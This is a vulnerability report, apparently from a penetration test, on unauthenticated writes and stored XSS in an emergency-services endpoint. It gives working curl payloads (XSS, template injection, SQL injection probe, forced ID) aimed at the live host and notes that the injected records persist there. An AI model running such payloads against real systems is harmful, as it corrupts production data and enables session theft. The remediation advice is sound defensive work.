# 4008 /MciTypes 無認證寫入 + Stored XSS 持久化（不對稱鑒權設計漏洞）

- ID: `719bf5bd-c811-45ca-a58d-1f5c2e6ed521`
- Severity: **critical**
- Status: open
- Type: Stored XSS / Broken Access Control / Mass Assignment
- Target: `https://epcr.tpf.gov.tw:4008/MciTypes (集合級 NOAUTH + Stored XSS + 業務字典污染)`
- Conversation: `d616190f-0d59-4d31-882b-33ba2ea72121`
- Created: 2026-08-29 18:00:19.857287907+08:00

## Description

4008 /MciTypes 端點的集合級 GET 與 POST 完全無需認證，PUT/PATCH/DELETE 資源級 401（486B "No authorization token was found"）—— 形成**不對稱鑒權設計**。攻擊者可匿名 GET 列出全部業務字典（含已注入的 Stored XSS payload id=1003/1024/1025），並通過 POST 寫入任意攻擊 payload 包括 Stored XSS、SQLi 探測、強制 ID 寫入。當管理員登入 4008 前端查看 MciTypes 字典時將觸發存儲 XSS。

## Preconditions

無需認證、無需登入態、無 CORS 限制、可從互聯網直接訪問 https://epcr.tpf.gov.tw:4008/MciTypes

## Reproduction

1. 訪問 https://epcr.tpf.gov.tw:4008/MciTypes（無需登入），確認返回 200 OK 含全部業務字典
2. 使用 curl POST 寫入 Stored XSS：
   ```
   curl -X POST -H "Content-Type: application/json" \
     -d '{"name":"<script>alert(1)</script>"}' \
     https://epcr.tpf.gov.tw:4008/MciTypes
   ```
3. 預期結果：返回 201 Created，response body 含 `"id":1003`（或更新的 ID）
4. 驗證持久化：再次 GET https://epcr.tpf.gov.tw:4008/MciTypes 確認新記錄存在
5. 嘗試清理：curl -X DELETE https://epcr.tpf.gov.tw:4008/MciTypes/{id} → 應返回 401 "No authorization token was found"
6. 確認不對稱鑒權：GET/POST 200/201（NOAUTH），DELETE/PUT/PATCH 401（鑒權開啟）

## Evidence

**Stored XSS（id=1003 已寫入）**：
```bash
curl -X POST -H "Content-Type: application/json" \
  -d '{"name":"<script>alert(1)</script>"}' \
  https://epcr.tpf.gov.tw:4008/MciTypes
# 響應: 201 Created
```
**XSS + SSTI（id=1024）**：
```bash
curl -X POST -d '{"name":"{{constructor.constructor(\"alert(1)\")()}}"}' \
  -H "Content-Type: application/json" https://epcr.tpf.gov.tw:4008/MciTypes
```
**SQLi 探測（id=1025）**：
```bash
curl -X POST -d "{\"name\":\"test' OR 1=1 --\"}" \
  -H "Content-Type: application/json" https://epcr.tpf.gov.tw:4008/MciTypes
```
**強制 ID 寫入（id=1000001）**：
```bash
curl -X POST -d '{"name":"TestForcedId","id":1000001}' \
  -H "Content-Type: application/json" https://epcr.tpf.gov.tw:4008/MciTypes
```

## Impact

1. Stored XSS 持久化：管理員登入查看字典時觸發任意 JS，可竊取會話/CSRF/SSRF
2. 業務字典污染：覆蓋案件類型誤導現場救護人員
3. SQLi 攻擊面擴展：強制 ID 寫入 + 髒數據繞過二次查詢
4. 無法清理：DELETE 401，需 DB 管理員手動清理
5. 歷史污染：表中已存在 8+ 條歷史測試記錄（id=5-10/999/1000/1001-1006/1012/1024-1026/1000001）
6. 不對稱鑒權：證明 Express middleware 錯誤配置

## Recommendation

1. **立即修復**：在 /MciTypes 集合級路由掛載 auth middleware（與資源級保持一致），拒絕未認證 GET/POST 訪問
2. **清理現有污染數據**：通過 SQL 直接刪除 id=5-10/999/1000/1001-1006/1012/1024-1026/1000001 等異常記錄
3. **輸入校驗**：name 字段增加 HTML 轉義、長度限制（<=255）、類型校驗（必須為 string）
4. **Mass Assignment 防護**：禁止客戶端傳入 `id` 字段（即使 Sequelize 接受也應在 controller 層過濾）
5. **CSP**：在 4008 響應頭新增 Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-...' 阻斷 inline script
6. **WAF 規則**：部署 WAF 過濾 MciTypes POST body 中的 `<script>`/`{{`/`'` 等危險字符
7. **日誌告警**：監控 MciTypes POST 寫入異常（高頻、特殊字符），觸發告警
